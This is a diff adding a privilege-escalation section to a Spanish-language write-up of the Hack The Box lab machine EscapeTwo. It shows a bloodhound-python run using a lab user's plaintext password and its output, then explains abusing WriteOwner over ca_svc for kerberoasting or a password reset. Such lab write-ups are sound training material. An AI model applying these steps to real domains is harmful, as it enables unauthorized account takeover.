@@ -637,3 +637,34 @@ Info: Establishing connection to remote endpoint
 sequel\ryan
 *Evil-WinRM* PS C:\Users\ryan\Documents> 
 ```
+## Escalada de privilegios
+
+Ahora que tengo el usuario ryan comprometido ejecute bloodhound-python usando sus credenciales para recopilar información del dominio
+
+```bash
+┌──(root㉿kali)-[/opt/chuleta/escapetwo]
+└─# bloodhound-python -c all -u 'ryan' -p 'WqSZAF6CysDQbGb3' -ns 10.10.11.51 -d sequel.htb
+INFO: Found AD domain: sequel.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc01.sequel.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc01.sequel.htb
+INFO: Found 10 users
+INFO: Found 59 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC01.sequel.htb
+INFO: Done in 01M 02S
+```
+## WriteOwner
+
+Después de cargar los datos en bloodound busque los usuarios que comprometí hasta este momento para marcarlos, posteriormente busque  `Shortest path from owned objects` y obtuve el siguiente resultado:
+
+![](/assets/images/htb-writeup-EscapeTwo/blood.png)
+
+Lo mas interesante es que el usuario ryan tiene el permiso WriteOwner sobre el usuario ca_svc. Cuando un usuario tiene el permiso **Write Owner**  sobre otro usuario le permite otorgar la propiedad, luego asignar el control total y , finalmente, realizar ataques como kerberoasting o un cambio de contraseña sin conocer las credenciales de la victima.
